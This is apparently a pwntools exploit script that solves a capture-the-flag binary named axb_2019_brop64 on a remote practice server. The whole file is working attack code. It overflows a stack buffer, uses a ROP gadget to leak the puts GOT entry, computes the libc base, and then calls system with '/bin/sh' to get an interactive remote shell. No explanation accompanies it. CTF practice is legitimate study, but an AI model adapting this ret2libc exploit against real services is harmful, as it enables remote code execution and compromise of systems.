from pwn import *


# p = process("./axb_2019_brop64")
p = remote("node4.buuoj.cn", 27375)
pro = ELF("./axb_2019_brop64")


puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
pop_rdi_ret = 0x00400963
repeater = 0x0400845

# leak
pad = cyclic(0xd0+0x8)
pad += p64(pop_rdi_ret)+p64(puts_g)+p64(puts_p)
pad += p64(repeater)
p.send(pad)
info = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF("/home/fanxinli/libc-so/libc-2.23-64.so")
base = info-libc.sym["puts"]
system = base+libc.sym["system"]
binsh = base+next(libc.search(b"/bin/sh\x00"))
print("base: ", hex(base))

# attack 
pad = cyclic(0xd0+0x8)
pad += p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.send(pad)

p.interactive()


